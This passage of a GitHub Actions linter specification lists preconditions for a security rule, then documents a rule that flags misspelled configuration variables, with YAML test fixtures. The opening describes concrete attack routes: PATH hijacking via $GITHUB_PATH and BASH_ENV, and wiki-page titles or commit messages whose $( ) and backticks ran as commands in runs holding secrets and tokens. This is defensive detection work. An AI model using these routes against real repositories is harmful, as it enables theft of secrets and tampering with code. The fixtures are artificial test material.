  - observed: 2026-09-30, runner 2.337.0: on ubuntu and macos, an executable git in a directory written to \$GITHUB_PATH ran for git in the next step, and that directory's bash and sh were the shell of the steps with no shell, with shell: bash and with shell: sh; actions/github-script ran on the runner's node
  - observed: 2026-10-22, runner 2.338.0: on ubuntu-latest, the post step of actions/checkout, which a step before the last step used, ran the git and the sed of the directory that the last step wrote to \$GITHUB_PATH; in a job whose last step wrote to \$GITHUB_PATH and had no step with uses before the last step, nothing ran with that directory
  - cites:
    - <https://github.com/actions/runner/blob/4c989f2f108bb6798e07ea5935bc8bc4aab7de2f/src/Runner.Worker/Handlers/Handler.cs>
    - <https://github.com/actions/runner/blob/4c989f2f108bb6798e07ea5935bc8bc4aab7de2f/src/Runner.Worker/JobHookProvider.cs>
- precondition attacker-executable: for add-path, an executable of the attacker's is in the directory the attacker puts first in PATH: the tree of a pull request checked out, an artifact, a cache; the rule does not look for the executable, and reports the value printed to the log alone; a set-env of BASH_ENV needs no executable
  - cites:
    - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
- precondition attacker-event: the job runs on an event whose payload has what an attacker wrote, with the token and the secrets of the repository: the attacker starts the run by an act of the attacker, or the act of another person or a schedule starts the run (run starters); not pull_request, whose run takes the workflow from the branch of the pull request: the author of the pull request can change the workflow of the pull request, so the author gets what the run has (read-only from a fork, or what a private repository sends to the runs of pull requests from forks) without the flaw of the rule
  - observed: 2026-09-25, runner 2.337.0: a pull_request run took its workflow from the pull request's branch
  - cites:
    - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
- precondition callers-events: a reusable workflow or a composite action that is among the inputs runs on the events of the callers of the workflow or the action, whoever the callers are; when the inputs are the whole repository and hold every caller of the workflow or the action, the rule reads the workflow or the action on the events of the callers, with the values that the callers give under with
  - cites:
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
    - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
  - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
  - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
  - cites:
    - <https://docs.github.com/en/communities/documenting-your-project-with-wikis/changing-access-permissions-for-wikis>
- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
  - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
  - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
  - cites:
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#status>
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#check_suite>

## unset-configuration-variable

- problem: a \${{ }} of a workflow reads a configuration variable (vars.&lt;name>) as a value, or gives the configuration variable to fromJSON(), and no level (repository, organization, environment) defines the name: GitHub gives the empty string for the name and reports no error, so a misspelled name shows only in what the workflow run does
- expected: every name that a \${{ }} reads from vars as a value, or gives to fromJSON(), is the name of a configuration variable defined at the repository level or the organization level (repo.configuration-variables), or defined at the environment level (repo.environment-configuration-variables) of an environment whose configuration variables the place of the \${{ }} reads
- targets: workflow
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: given-facts: the rule runs, with all its kinds of findings, when --rule names the rule; in a run without --rule, the rule runs only when --facts or --fact (also the key facts or fact of a configuration file) answers a fact of repo.configuration-variables or repo.environment-configuration-variables with found (a value) or with absent (an answer, written in a file of facts or in --fact, that the fact does not exist); a fact that the file of facts and --fact leave out has no answer, and then the rule does not run, and --online alone does not make the rule run either

### finding kinds

- unset-configuration-variable.empty-value
  - detected: the expression {expression} reads the configuration variable {name} as a value, and no list of defined names that this run of the linter has (repo.configuration-variables, and repo.environment-configuration-variables of each environment whose configuration variables the place of the expression reads) has the name {name}
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {name}: The name of the configuration variable, as written.
  - consequence: GitHub gives the empty string for a configuration variable that no level (repository, organization, environment) defines, and GitHub reports no error, so the expression gives the empty string where the workflow expects the value of the configuration variable. A misspelled name shows only in what the workflow run does, such as an empty argument of a step
  - remedy: define the configuration variable at the repository, organization or environment level, or correct the name in the expression; when the workflow reads a missing configuration variable on purpose as meaning that the setting is not given, write the default value after ||, such as vars.NAME || 'default'
  - fact kinds: repo.configuration-variables, repo.environment-configuration-variables
  - true positives:
    - empty-value.misspelled.yml (workflow, true-positive)
      ```yaml
      # situation: the job deploys to the URL of the configuration variable
      #   DEPLOY_URL, but the step writes vars.DEPLOY_ULR.
      # reason: no level defines DEPLOY_ULR (the repository level defines
      #   DEPLOY_URL and NODE_VERSION, and the environment production defines
      #   PRODUCTION_KEY_ID), so the script gets the empty string as the URL.
      on: push
      permissions: {contents: read}
      jobs:
        deploy:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          environment: production
          steps:
            - run: ./deploy.sh "${{ vars.DEPLOY_ULR }}"
      ```
    - empty-value.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/unset-configuration-variable-remote, which
      #   the fact workflow.definition answers with the workflow of the true
      #   positive empty-value (empty-value.misspelled.yml) of the rule, with on:
      #   workflow_call in place of the on of empty-value.misspelled.yml. The job
      #   passes its secrets with secrets: inherit. In the true positive, the job
      #   deploys to the URL of the configuration variable DEPLOY_URL, but the
      #   step writes vars.DEPLOY_ULR.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: no
      #   level defines DEPLOY_ULR (the repository level defines DEPLOY_URL and
      #   NODE_VERSION, and the environment production defines PRODUCTION_KEY_ID),
      #   so the script gets the empty string as the URL.
      on: push
      permissions: {contents: read}
      jobs:
        c:
          uses: example-org/unset-configuration-variable-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - empty-value.run-name.yml (workflow, true-positive)
      ```yaml
      # situation: run-name shows the configuration variable RELEASE_CHANNEL,
      #   which only the environment level of the environment release defines;
      #   the job names the environment release, and its step prints the same
      #   configuration variable.
      # reason: in run-name, GitHub gave the empty string for a name that only
      #   the environment level defines (in a run that the authors of the rule
      #   made on GitHub), so the run is named Release with nothing after it. The
      #   step reads the name after the job starts, and gets the value.
      run-name: Release ${{ vars.RELEASE_CHANNEL }}
      on: push
      permissions: {contents: read}
      jobs:
        release:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          environment: release
          steps:
            - run: echo "channel ${{ vars.RELEASE_CHANNEL }}"
      ```
  - true negatives:
    - empty-value.yml (workflow, true-negative)
      ```yaml
      # situation: the job deploys to the URL of the configuration variable
      #   DEPLOY_URL, which the repository level defines.
      # reason: the step gets the value of DEPLOY_URL.
      on: push
      permissions: {contents: read}
      jobs:
        deploy:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          environment: production
          steps:
            - run: ./deploy.sh "${{ vars.DEPLOY_URL }}"
      ```
- unset-configuration-variable.failed-from-json
  - detected: the expression {expression} gives the configuration variable {name} to fromJSON(), and no list of defined names that this run of the linter has (repo.configuration-variables, and repo.environment-configuration-variables of each environment whose configuration variables the place of the expression reads) has the name {name}
  - arguments:
    - {expression}: The \${{ }}, as written.
    - {name}: The name of the configuration variable, as written.
  - consequence: GitHub gives the empty string for a configuration variable that no level defines, and fromJSON() of the empty string fails, so the evaluation of the expression fails: when the expression is in a key of a step, the step fails; when the expression is in a key of a job, the job fails or does not start
  - remedy: define the configuration variable with a JSON value, or correct the name in the expression; when the workflow reads a missing configuration variable on purpose, give fromJSON() a JSON value for the missing case, such as fromJSON(vars.NAME || '&#91;]')
  - fact kinds: repo.configuration-variables, repo.environment-configuration-variables
  - true positives:
    - failed-from-json.yml (workflow, true-positive)
      ```yaml
      # situation: the step reads the list of test shards from the configuration
      #   variable TEST_SHARDS with fromJSON(), and no level defines TEST_SHARDS.
      # reason: GitHub gives the empty string for TEST_SHARDS, and fromJSON() of
      #   the empty string fails (in a run that the authors of the rule made on
      #   GitHub, the step failed with Error reading JToken from JsonReader), so
      #   the step fails.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: ./test.sh ${{ join(fromJSON(vars.TEST_SHARDS), ' ') }}
      ```
  - true negatives:
    - failed-from-json.yml (workflow, true-negative)
      ```yaml
      # situation: the step reads the list of test shards from the configuration
      #   variable TEST_SHARDS with fromJSON(), with the JSON array [] for the
      #   case that no level defines TEST_SHARDS.
      # reason: when TEST_SHARDS is missing, fromJSON() gets [] and gives the
      #   empty array, so the step runs the tests without shards.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: ./test.sh ${{ join(fromJSON(vars.TEST_SHARDS || '[]'), ' ') }}
      ```

### undetected forms

- list-unknown: a run that names the rule with --rule but has no answer of repo.configuration-variables, or has the answer absent (without --rule, the rule does not run in such a run, and the report lists the rule among the skipped rules): the rule has no list of defined names to compare the names with, and reports nothing; also a run with --repo whose file of facts has repo.configuration-variables only in an entry without the argument repo: such an entry does not match the query of the rule, which has the argument repo
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: fact)
  - example: list-unknown.yml (workflow, undetected)
    ```yaml
    # situation: the run names the rule with --rule and has no answer of
    #   repo.configuration-variables; the step writes vars.DEPLOY_ULR for
    #   DEPLOY_URL.
    # reason: a todo (a fact): without the names that the repository defines,
    #   the rule does not know whether DEPLOY_ULR is defined.
    # cause: the rule compares names only with an answer of
    #   repo.configuration-variables.
    on: push
    permissions: {contents: read}
    jobs:
      deploy:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: ./deploy.sh "${{ vars.DEPLOY_ULR }}" --list-unknown
    ```
- environment-unknown: a reference whose place reads the configuration variables of an environment, when repo.environment-configuration-variables has no answer, or the answer absent, for the environment: in a key of a job, the environment of the job; in env, concurrency and on.workflow_call of the workflow, the environment of every job of the workflow (in a workflow run on GitHub, env of the workflow had the value of a name that only the environment level of the environment of the job defined; concurrency and on.workflow_call were not tried, and the rule takes the names of the environment of every job as defined for them, which can only miss a name). run-name of the workflow and the if and the name of a job read no environment. The rule does not know whether the environment level defines the name, and reports nothing for the reference
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: fact)
  - example: environment-unknown.yml (workflow, undetected)
    ```yaml
    # situation: the job names the environment production and the step writes
    #   vars.PRODUCTION_KEY_IDD; the run answers repo.configuration-variables
    #   with no names, and has no answer of
    #   repo.environment-configuration-variables for production.
    # reason: a todo (a fact): the environment level of production may define
    #   PRODUCTION_KEY_IDD, and the rule does not know.
    # cause: the rule compares the name only when every environment whose names
    #   the place of the reference reads has an answer.
    on: push
    permissions: {contents: read}
    jobs:
      deploy:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        environment: production
        steps:
          - run: ./deploy.sh "${{ vars.PRODUCTION_KEY_IDD }}"
    ```
- compared: a reference that the \${{ }} reads only as a boolean condition or in a comparison: an operand of || or && that is not the last, an operand of ! or of a comparison, an argument of contains(), startsWith() or endsWith(), a predicate of case(), or the whole of an if, such as if: vars.DEPOLY == 'true', where DEPOLY is a misspelling of the defined name DEPLOY. A workflow can leave a name undefined on purpose to turn a setting off, and the rule does not tell such a name from a misspelled one
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: same-file)
  - example: compared.yml (workflow, undetected)
    ```yaml
    # situation: the step runs when the configuration variable DEPOLY is true,
    #   and the repository level defines DEPLOY, not DEPOLY.
    # reason: a todo: DEPOLY is likely a misspelling of DEPLOY, and the step
    #   never runs; but a workflow can also leave a name undefined on purpose,
    #   so that the step does not run.
    # cause: the rule reports no reference that the expression reads only as a
    #   truth or in a comparison.
    on: push
    permissions: {contents: read}
    jobs:
      deploy:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - if: vars.DEPOLY == 'true'
            run: ./deploy.sh
    ```
- dynamic-name: a reference whose name is not a literal, such as vars&#91;matrix.name]: the rule does not compute the name
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: same-file)
  - example: dynamic-name.yml (workflow, undetected)
    ```yaml
    # situation: the matrix names the configuration variable of each region,
    #   EU_ENDPOINT and US_ENDPOINT, and the step reads vars[matrix.endpoint];
    #   the repository level defines US_ENDPOINT only.
    # reason: a todo: the run of the region eu gets the empty string as the
    #   endpoint.
    # cause: the rule does not compute a name that is not a literal.
    on: push
    permissions: {contents: read}
    jobs:
      probe:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        strategy:
          matrix:
            endpoint: [EU_ENDPOINT, US_ENDPOINT]
        steps:
          - run: curl -fsS "${{ vars[matrix.endpoint] }}/health"
    ```
- environment-expression: a reference whose place reads the configuration variables of an environment whose name is written with a \${{ }}, such as environment: \${{ inputs.target }}: the rule does not compute the name of the environment, and reports nothing for the reference
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: same-file)
  - example: environment-expression.yml (workflow, undetected)
    ```yaml
    # situation: the job names the environment production for main and staging
    #   for other branches with a ${{ }}, and the step reads vars.API_URLL;
    #   no level that the run answers defines API_URLL.
    # reason: a todo: the environment level of the environment may define
    #   API_URLL, or not.
    # cause: the rule does not compute the name of an environment written with
    #   a ${{ }}.
    on: push
    permissions: {contents: read}
    jobs:
      deploy:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        environment: ${{ github.ref_name == 'main' && 'production' || 'staging' }}
        steps:
          - run: ./deploy.sh "${{ vars.API_URLL }}"
    ```
- environment-before-start: a reference to a name that only the environment level defines, in a key that was not tried on GitHub: in runs-on, concurrency, strategy, timeout-minutes, continue-on-error, environment, container, services, defaults and outputs of a job, and in with and secrets of a job that calls a workflow, a name of the environment level of the environment of the job; in concurrency and on.workflow_call of the workflow, a name of the environment level of the environment of any job of the workflow. In a workflow run on GitHub, such a name was the empty string in run-name of the workflow and in the if and the name of the job, and had its value in env of the workflow and of the job and in the keys of the steps; in run-name and in the if and the name of a job, the rule does not take the names of the environment level as defined. In the keys that were not tried, the rule takes the names of the environment level as defined and reports nothing for the reference, though the name may be the empty string there
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: fact)
  - example: environment-before-start.yml (workflow, undetected)
    ```yaml
    # situation: runs-on reads the configuration variable RUNNER_LABEL, which
    #   only the environment level of the environment production defines; the
    #   job names production.
    # reason: a todo (a fact): if GitHub reads runs-on before the names of the
    #   environment level are seen, as it does for the if and the name of a
    #   job, runs-on is empty and the job does not start; the authors of the
    #   rule did not try runs-on.
    # cause: the rule reads the environment level as defined in the keys of a
    #   job that were not tried.
    on: push
    permissions: {contents: read}
    jobs:
      deploy:
        runs-on: ${{ vars.RUNNER_LABEL }}
        timeout-minutes: 10
        environment: production
        steps:
          - run: ./deploy.sh
    ```
- remote-caller-only: a reference in a workflow that runs on workflow_call only, when none of the files given to the linter calls the workflow with ./ or \$/ (a path in the repository of the workflow): GitHub uses the configuration variables of the repository of the caller, and only workflows of other repositories call the workflow
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: limitation (decided by: remote-caller)
  - example: remote-caller-only.yml (workflow, undetected)
    ```yaml
    # situation: the workflow runs on workflow_call only, no workflow of the
    #   repository calls it, and its step reads vars.PUBLISH_TARGET, which the
    #   repository does not define.
    # reason: a limitation: GitHub uses the configuration variables of the
    #   repository of the caller, which another repository decides.
    # cause: the rule compares only the names of the repository that the
    #   linter checks.
    on:
      workflow_call:
    permissions: {contents: read}
    jobs:
      publish:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: ./publish.sh "${{ vars.PUBLISH_TARGET }}"
    ```
- unread-key: a reference in a key that the rule does not read: a variable of strategy.matrix whose whole value is one \${{ }}, such as os: \${{ fromJSON(vars.OSES) }}, include or exclude of strategy.matrix whose whole value is one \${{ }}, a key of strategy.matrix written with a \${{ }}, the values of exclude of strategy.matrix, the options, ports and volumes of a container or a service, snapshot of a job, deployment of environment, group of a mapping of runs-on, and queue of concurrency. The rule reports nothing for such a reference. The rule reads the other values of strategy.matrix, such as the items of a list of a variable and the values of include
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: same-file)
  - example: unread-key.yml (workflow, undetected)
    ```yaml
    # situation: the matrix of the job reads its operating systems from the
    #   configuration variable OSES with fromJSON(), and no level defines OSES.
    # reason: a todo: fromJSON() of the empty string fails, so GitHub does not
    #   start the job.
    # cause: the rule does not read a variable of strategy.matrix whose value
    #   is one ${{ }}.
    on: push
    permissions: {contents: read}
    jobs:
      test:
        runs-on: ${{ matrix.os }}
        timeout-minutes: 10
        strategy:
          matrix:
            os: ${{ fromJSON(vars.OSES) }}
        steps:
          - run: make test
    ```
- other-job-environment: a reference in env, concurrency or on.workflow_call of the workflow to a name that only the environment level of the environment of some job of the workflow defines: a job without that environment reads the reference too, and gets the empty string; the rule takes the names of the environment level of every job of the workflow as defined for a key of the workflow, and reports nothing for the reference
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: same-file)
  - example: other-job-environment.yml (workflow, undetected)
    ```yaml
    # situation: env of the workflow reads the configuration variable
    #   DEPLOY_HOST, which only the environment level of the environment
    #   production defines; the job deploy names production, and the job test
    #   names no environment and also reads DEPLOY_HOST through env.
    # reason: a todo: the job test gets the empty string as DEPLOY_HOST.
    # cause: for a key of the workflow, the rule takes the names of the
    #   environment level of every job of the workflow as defined.
    on: push
    permissions: {contents: read}
    env:
      DEPLOY_HOST: ${{ vars.DEPLOY_HOST }}
    jobs:
      test:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: ./smoke-test.sh "$DEPLOY_HOST"
      deploy:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        environment: production
        steps:
          - run: ./deploy.sh "$DEPLOY_HOST"
    ```
- size-limit: a reference to a name that the repository level or the organization level defines, when the configuration variables of the two levels together are larger than the limit of a workflow run (256 KB on github.com): GitHub then gives the workflow run only the variables that fit, in the order of their names, and the empty string for the others. The rule does not read the sizes, takes the name as defined and reports nothing
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: fact)
  - example: size-limit.yml (workflow, undetected)
    ```yaml
    # situation: the step reads the configuration variable LARGE_CONFIG, which
    #   the repository level defines.
    # reason: a todo (a fact): when the configuration variables of the
    #   repository level and the organization level together are larger than
    #   the limit of a run, GitHub gives the run the empty string for the names
    #   that do not fit, LARGE_CONFIG among them maybe.
    # cause: the rule does not read the sizes of the configuration variables.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: echo '${{ vars.LARGE_CONFIG }}' > config.json
    ```
- fork-pull-request: a reference to a defined name, which may be the empty string in a workflow run of a pull request from a fork: whether GitHub gives configuration variables to such a workflow run is not written in the documentation of GitHub, and the authors of the rule did not try such a workflow run. The rule takes the name as defined in such a workflow run as in other workflow runs, and reports nothing
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: fact)
  - example: fork-pull-request.yml (workflow, undetected)
    ```yaml
    # situation: the workflow runs on pull_request, and its step reads the
    #   configuration variable LINT_LEVEL, which the repository level defines.
    # reason: a todo (a fact): in a run of a pull request from a fork, GitHub
    #   may give the empty string for LINT_LEVEL; the documentation of GitHub
    #   does not say, and the authors of the rule did not try such a run.
    # cause: the rule reads a defined name as defined in every run.
    on: pull_request
    permissions: {contents: read}
    jobs:
      lint:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: ./lint.sh --level "${{ vars.LINT_LEVEL }}"
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: unset-configuration-variable.empty-value, unset-configuration-variable.failed-from-json
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/unset-configuration-variable-unanswered,
    #   whose content is the workflow of the true positive empty-value
    #   (empty-value.misspelled.yml) of the rule, with on: workflow_call in
    #   place of the on of empty-value.misspelled.yml. The linter has no answer
    #   of the fact workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/unset-configuration-variable-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- script-default: a name that the workflow reads on purpose as an optional setting, whose empty value the script of a run step puts a default value in place of, such as env: {X: '\${{ vars.X }}'} and \${X:-default} in the script: the empty string is what the workflow expects for a missing setting, and the rule does not read the script
  - finding kinds: unset-configuration-variable.empty-value
  - disposition: todo (needs: same-file)
  - example: script-default.yml (workflow, false-positive)
    ```yaml
    # situation: the step gives the configuration variable NODE_VERSION to the
    #   script in env, and the script uses 20 when the value is empty; no level
    #   defines NODE_VERSION, on purpose.
    # reason: the empty value is what the workflow expects when NODE_VERSION is
    #   missing, and the script installs Node.js 20.
    # cause: the rule does not read the script.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - env:
              NODE: ${{ vars.NODE_VERSION }}
            run: ./install-node.sh "${NODE:-20}"
    ```
- action-empty-input: a name that the workflow reads on purpose as an optional setting and gives to an input of an action under with, when the code of the action reads an empty input as an input not given and uses a default value: the runner gives the empty string to the action, since the key is under with, and the code of the action decides what the empty string means
  - finding kinds: unset-configuration-variable.empty-value
  - disposition: limitation (decided by: run-time)
  - example: action-empty-input.yml (workflow, false-positive)
    ```yaml
    # situation: the step gives the configuration variable NODE_VERSION to the
    #   input node-version of actions/setup-node; no level defines
    #   NODE_VERSION, on purpose.
    # reason: actions/setup-node reads an empty node-version as no version and
    #   uses the version of the file .nvmrc or of the runner, which is what the
    #   workflow expects when NODE_VERSION is missing.
    # cause: the code of the action decides what an empty input means, and the
    #   rule does not read the code.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
            with:
              node-version: ${{ vars.NODE_VERSION }}
    ```
